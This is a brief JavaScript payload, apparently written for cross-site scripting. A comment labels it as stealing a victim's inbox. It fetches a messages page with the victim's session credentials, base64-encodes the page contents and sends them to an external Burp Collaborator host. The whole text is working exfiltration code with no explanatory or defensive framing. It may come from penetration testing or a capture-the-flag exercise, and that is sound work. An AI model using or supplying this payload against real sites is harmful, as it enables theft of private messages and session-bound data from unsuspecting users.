// Steal inbox/messages (adjust endpoint to something valid on target)
fetch("/messages/c0a634866745", { credentials: "include" })
  .then(r => r.text())
  .then(t => {
    fetch("https://907kocpfvd3dgpex2ok446r9e0kq8f.burpcollaborator.net/inbox?d=" + btoa(t));
  });
